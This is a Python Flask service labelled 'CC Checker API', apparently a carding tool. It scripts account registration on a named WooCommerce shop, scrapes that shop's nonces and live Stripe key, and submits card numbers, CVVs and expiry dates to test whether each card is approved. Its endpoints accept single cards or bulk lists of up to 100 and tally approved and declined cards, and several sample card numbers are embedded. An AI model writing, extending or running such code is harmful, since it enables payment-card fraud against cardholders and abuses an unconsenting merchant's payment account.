from flask import Flask, request, jsonify
from flask_cors import CORS
import requests
import json
import random
import re
import asyncio
import time
from fake_useragent import UserAgent

app = Flask(__name__)
CORS(app)  # Enable CORS for all routes

# ==================== HELPER FUNCTIONS ====================

def gets(s, start, end):
    """Extract text between two strings"""
    try:
        start_index = s.index(start) + len(start)
        end_index = s.index(end, start_index)
        return s[start_index:end_index]
    except ValueError:
        return None

async def get_random_info():
    """Generate random email and user"""
    return {
        "email": f"user{random.randint(100000, 999999)}@gmail.com",
        "username": f"user{random.randint(100000, 999999)}"
    }

# ==================== MAIN CHECK FUNCTION ====================

async def check_cc(fullz):
    """
    Check a single credit card
    Format: card_number|month|year|cvv
    Example: 4106210007965080|08|2029|130
    """
    try:
        # Parse card details
        cc, mes, ano, cvv = fullz.split("|")
        if len(ano) == 2:
            ano = "20" + ano
        
        # Generate random user info
        random_data = await get_random_info()
        email = random_data["email"]
        user = random_data["username"]

        # Create session
        s = requests.Session()
        
        # ============ STEP 1: Get Registration Nonce ============
        headers = {
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'accept-language': 'en-IN,en;q=0.9',
            'cache-control': 'max-age=0',
            'priority': 'u=0, i',
            'referer': 'https://radio-tecs.com/my-account-2/add-payment-method/',
            'sec-ch-ua': '"Chromium";v="131", "Not_A Brand";v="24", "Microsoft Edge Simulate";v="131", "Lemur";v="131"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
            'sec-fetch-dest': 'document',
            'sec-fetch-mode': 'navigate',
            'sec-fetch-site': 'same-origin',
            'sec-fetch-user': '?1',
            'upgrade-insecure-requests': '1',
            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Mobile Safari/537.36',
        }

        response = s.get('https://radio-tecs.com/my-account-2/', headers=headers)
        
        nonce = gets(response.text, 
                    '<input type="hidden" id="woocommerce-register-nonce" name="woocommerce-register-nonce" value="', 
                    '" />')
        
        if not nonce:
            return {"status": "error", "message": "Failed to get registration nonce"}

        # ============ STEP 2: Register Account ============
        headers = {
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'accept-language': 'en-IN,en;q=0.9',
            'cache-control': 'max-age=0',
            'content-type': 'application/x-www-form-urlencoded',
            'origin': 'https://radio-tecs.com',
            'priority': 'u=0, i',
            'referer': 'https://radio-tecs.com/my-account-2/',
            'sec-ch-ua': '"Chromium";v="131", "Not_A Brand";v="24", "Microsoft Edge Simulate";v="131", "Lemur";v="131"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
            'sec-fetch-dest': 'document',
            'sec-fetch-mode': 'navigate',
            'sec-fetch-site': 'same-origin',
            'sec-fetch-user': '?1',
            'upgrade-insecure-requests': '1',
            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Mobile Safari/537.36',
        }

        data = {
            'username': user,
            'email': email,
            'mailpoet[subscribe_on_register_active]': '1',
            'wc_order_attribution_source_type': 'typein',
            'wc_order_attribution_referrer': '(none)',
            'wc_order_attribution_utm_campaign': '(none)',
            'wc_order_attribution_utm_source': '(direct)',
            'wc_order_attribution_utm_medium': '(none)',
            'wc_order_attribution_utm_content': '(none)',
            'wc_order_attribution_utm_id': '(none)',
            'wc_order_attribution_utm_term': '(none)',
            'wc_order_attribution_utm_source_platform': '(none)',
            'wc_order_attribution_utm_creative_format': '(none)',
            'wc_order_attribution_utm_marketing_tactic': '(none)',
            'wc_order_attribution_session_entry': 'https://radio-tecs.com/',
            'wc_order_attribution_session_start_time': '2025-08-29 09:50:42',
            'wc_order_attribution_session_pages': '2',
            'wc_order_attribution_session_count': '1',
            'wc_order_attribution_user_agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Mobile Safari/537.36',
            'woocommerce-register-nonce': nonce,
            '_wp_http_referer': '/my-account-2/',
            'register': 'Register',
        }

        response = s.post('https://radio-tecs.com/my-account-2/', headers=headers, data=data)

        # ============ STEP 3: Go to Payment Methods ============
        headers = {
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'accept-language': 'en-IN,en;q=0.9',
            'priority': 'u=0, i',
            'referer': 'https://radio-tecs.com/my-account-2/',
            'sec-ch-ua': '"Chromium";v="131", "Not_A Brand";v="24", "Microsoft Edge Simulate";v="131", "Lemur";v="131"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
            'sec-fetch-dest': 'document',
            'sec-fetch-mode': 'navigate',
            'sec-fetch-site': 'same-origin',
            'sec-fetch-user': '?1',
            'upgrade-insecure-requests': '1',
            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Mobile Safari/537.36',
        }

        response = s.get('https://radio-tecs.com/my-account-2/payment-methods/', headers=headers)

        # ============ STEP 4: Get Add Payment Method Page ============
        headers = {
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image.webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'accept-language': 'en-IN,en;q=0.9',
            'priority': 'u-0, i',
            'referer': 'https://radio-tecs.com/my-account-2/payment-methods/',
            'sec-ch-ua': '"Chromium";v="131", "Not_A Brand";v="24", "Microsoft Edge Simulate";v="131", "Lemur";v="131"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
            'sec-fetch-dest': 'document',
            'sec-fetch-mode': 'navigate',
            'sec-fetch-site': 'same-origin',
            'sec-fetch-user': '?1',
            'upgrade-insecure-requests': '1',
            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Mobile Safari/537.36',
        }

        response = s.get('https://radio-tecs.com/my-account-2/add-payment-method/', headers=headers)
        
        pnonce = gets(response.text, '"createAndConfirmSetupIntentNonce":"', '"')
        
        if not pnonce:
            return {"status": "error", "message": "Failed to get payment nonce"}

        # ============ STEP 5: Create Payment Method on Stripe ============
        headers = {
            'accept': 'application/json',
            'accept-language': 'en-IN,en;q=0.9',
            'content-type': 'application/x-www-form-urlencoded',
            'origin': 'https://js.stripe.com',
            'priority': 'u=1, i',
            'referer': 'https://js.stripe.com/',
            'sec-ch-ua': '"Chromium";v="131", "Not_A Brand";v="24", "Microsoft Edge Simulate";v="131", "Lemur";v="131"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-site',
            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Mobile Safari/537.36',
        }

        data = {
            'type': 'card',
            'card[number]': cc,
            'card[cvc]': cvv,
            'card[exp_year]': ano,
            'card[exp_month]': mes,
            'allow_redisplay': 'unspecified',
            'billing_details[address][country]': 'IN',
            'payment_user_agent': 'stripe.js/e837b000d9; stripe-js-v3/e837b000d9; payment-element; deferred-intent',
            'referrer': 'https://radio-tecs.com',
            'key': 'pk_live_51JRJFgJNjZL6EJkQHeYkzBEpfeXNg9qADJwvdvXWpA3a2Dzl6TXIQwOLC3dyb56lGKSPNm8a0nTL8PlqFrHejIop00DUXcrpCK',
            '_stripe_version': '2024-06-20',
        }

        response = requests.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data)
        
        if response.status_code != 200:
            return {"status": "error", "message": f"Stripe API Error: {response.status_code}"}

        try:
            payment_id = response.json()['id']
        except:
            return {"status": "error", "message": "Failed to get payment ID from Stripe"}

        # ============ STEP 6: Confirm Setup Intent ============
        headers = {
            'accept': '*/*',
            'accept-language': 'en-IN,en;q=0.9',
            'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
            'origin': 'https://radio-tecs.com',
            'priority': 'u=1, i',
            'referer': 'https://radio-tecs.com/my-account-2/add-payment-method/',
            'sec-ch-ua': '"Chromium";v="131", "Not_A Brand";v="24", "Microsoft Edge Simulate";v="131", "Lemur";v="131"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-origin',
            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Mobile Safari/537.36',
            'x-requested-with': 'XMLHttpRequest',
        }

        data = {
            'action': 'wc_stripe_create_and_confirm_setup_intent',
            'is_woopay_preflight_check': '0',
            'payment_method': payment_id,
            'wc-stripe-payment-method': payment_id,
            'wc-stripe-payment-type': 'card',
            '_ajax_nonce': pnonce,
        }

        response = s.post('https://radio-tecs.com/wp-admin/admin-ajax.php', headers=headers, data=data)
        
        # ============ STEP 7: Parse Result ============
        if response.status_code == 200:
            try:
                result = response.json()
                if result.get('success'):
                    return {
                        "status": "approved", 
                        "message": "Card is valid and approved"
                    }
                else:
                    error_data = result.get('data', {})
                    if isinstance(error_data, dict) and 'error' in error_data:
                        error_msg = error_data['error'].get('message', 'Unknown error')
                    else:
                        error_msg = result.get('data', {}).get('message', 'Unknown error')
                    return {
                        "status": "declined", 
                        "message": error_msg
                    }
            except json.JSONDecodeError:
                if response.text.strip() == '0':
                    return {
                        "status": "declined", 
                        "message": "Nonce verification failed"
                    }
                elif 'error' in response.text.lower():
                    return {
                        "status": "declined", 
                        "message": response.text[:100]
                    }
                else:
                    return {
                        "status": "unknown", 
                        "message": response.text[:100]
                    }
        else:
            return {
                "status": "error", 
                "message": f"HTTP Error: {response.status_code}"
            }

    except Exception as e:
        return {
            "status": "error", 
            "message": str(e)
        }

# ==================== FLASK API ENDPOINTS ====================

@app.route('/', methods=['GET'])
def home():
    """API Home Page"""
    return jsonify({
        "service": "CC Checker API",
        "version": "3.0",
        "description": "Check single or multiple credit cards",
        "endpoints": {
            "/check": {
                "method": "GET",
                "description": "Check single card via query parameter",
                "example": "/check?cc=4106210007965080|08|2029|130"
            },
            "/check": {
                "method": "POST",
                "description": "Check single or multiple cards via JSON body",
                "examples": {
                    "single": {"card": "4106210007965080|08|2029|130"},
                    "bulk": {"cards": ["card1", "card2"]}
                }
            },
            "/health": {
                "method": "GET",
                "description": "Health check"
            }
        }
    })

@app.route('/check', methods=['GET', 'POST'])
def check_cards():
    """
    Unified endpoint for GET and POST requests
    GET: /check?cc=card_number|month|year|cvv
    POST: JSON with card or cards array
    """
    
    # ============ GET REQUEST ============
    if request.method == 'GET':
        cc = request.args.get('cc')
        
        if not cc:
            return jsonify({
                "status": "error",
                "message": "Missing 'cc' parameter",
                "example": "/check?cc=4106210007965080|08|2029|130",
                "format": "CARD_NUMBER|MONTH|YEAR|CVV"
            }), 400
        
        # Validate format
        if "|" not in cc or len(cc.split("|")) != 4:
            return jsonify({
                "status": "error",
                "message": "Invalid card format. Use: number|month|year|cvv",
                "example": "4106210007965080|08|2029|130",
                "received": cc
            }), 400
        
        try:
            # Run check
            loop = asyncio.new_event_loop()
            asyncio.set_event_loop(loop)
            result = loop.run_until_complete(check_cc(cc))
            loop.close()
            
            # Return response
            return jsonify({
                "type": "single",
                "card": cc,
                "result": result,
                "timestamp": time.time()
            })
            
        except Exception as e:
            return jsonify({
                "status": "error",
                "message": f"Server error: {str(e)}"
            }), 500
    
    # ============ POST REQUEST ============
    elif request.method == 'POST':
        try:
            data = request.get_json()
            
            if not data:
                return jsonify({
                    "status": "error",
                    "message": "No JSON data provided",
                    "example": {
                        "card": "4106210007965080|08|2029|130"
                    }
                }), 400
            
            # Single card check
            if 'card' in data:
                card = data['card']
                
                # Validate format
                if not card or "|" not in card or len(card.split("|")) != 4:
                    return jsonify({
                        "status": "error",
                        "message": "Invalid card format. Use: number|month|year|cvv",
                        "example": "4106210007965080|08|2029|130"
                    }), 400
                
                loop = asyncio.new_event_loop()
                asyncio.set_event_loop(loop)
                result = loop.run_until_complete(check_cc(card))
                loop.close()
                
                return jsonify({
                    "type": "single",
                    "card": card,
                    "result": result,
                    "timestamp": time.time()
                })
            
            # Bulk cards check
            elif 'cards' in data:
                cards = data['cards']
                
                if not isinstance(cards, list):
                    return jsonify({
                        "status": "error",
                        "message": "cards must be an array"
                    }), 400
                
                if len(cards) == 0:
                    return jsonify({
                        "status": "error",
                        "message": "No cards provided"
                    }), 400
                
                if len(cards) > 100:
                    return jsonify({
                        "status": "error",
                        "message": "Maximum 100 cards allowed per request"
                    }), 400
                
                results = []
                for card in cards:
                    if not card or "|" not in card or len(card.split("|")) != 4:
                        results.append({
                            "card": card,
                            "result": {
                                "status": "error",
                                "message": "Invalid format"
                            }
                        })
                        continue
                    
                    loop = asyncio.new_event_loop()
                    asyncio.set_event_loop(loop)
                    result = loop.run_until_complete(check_cc(card))
                    loop.close()
                    
                    results.append({
                        "card": card,
                        "result": result
                    })
                
                approved = sum(1 for r in results if r['result'].get('status') == 'approved')
                declined = sum(1 for r in results if r['result'].get('status') == 'declined')
                errors = sum(1 for r in results if r['result'].get('status') == 'error')
                
                return jsonify({
                    "type": "bulk",
                    "total": len(cards),
                    "statistics": {
                        "approved": approved,
                        "declined": declined,
                        "errors": errors
                    },
                    "results": results,
                    "timestamp": time.time()
                })
            
            else:
                return jsonify({
                    "status": "error",
                    "message": "Send 'card' for single or 'cards' array for bulk check",
                    "examples": {
                        "single": {"card": "4106210007965080|08|2029|130"},
                        "bulk": {"cards": ["card1", "card2", "card3"]}
                    }
                }), 400
                
        except Exception as e:
            return jsonify({
                "status": "error",
                "message": f"Server error: {str(e)}"
            }), 500

@app.route('/health', methods=['GET'])
def health_check():
    """Health check endpoint"""
    return jsonify({
        "status": "healthy",
        "service": "CC Checker API",
        "version": "3.0",
        "timestamp": time.time()
    })

@app.errorhandler(404)
def not_found(e):
    return jsonify({
        "status": "error",
        "message": "Endpoint not found",
        "available_endpoints": ["/", "/check", "/health"]
    }), 404

@app.errorhandler(405)
def method_not_allowed(e):
    return jsonify({
        "status": "error",
        "message": "Method not allowed",
        "available_methods": ["GET", "POST"]
    }), 405

# ==================== RUN SERVER ====================

if __name__ == '__main__':
    print("=" * 50)
    print("🔥 CC Checker API Started (v3.0)")
    print("=" * 50)
    print(f"📍 Server: http://localhost:5000")
    print(f"\n📌 GET Examples:")
    print(f"   http://localhost:5000/check?cc=4106210007965080|08|2029|130")
    print(f"   http://localhost:5000/check?cc=5457568279494119|07|2026|260")
    print(f"\n📌 POST Examples:")
    print(f"   Single: POST /check with {{'card': '...'}}")
    print(f"   Bulk:   POST /check with {{'cards': [...]}}")
    print(f"\n📌 Health: GET /health")
    print("=" * 50)
    
    app.run(host='0.0.0.0', port=5000, debug=True, threaded=True)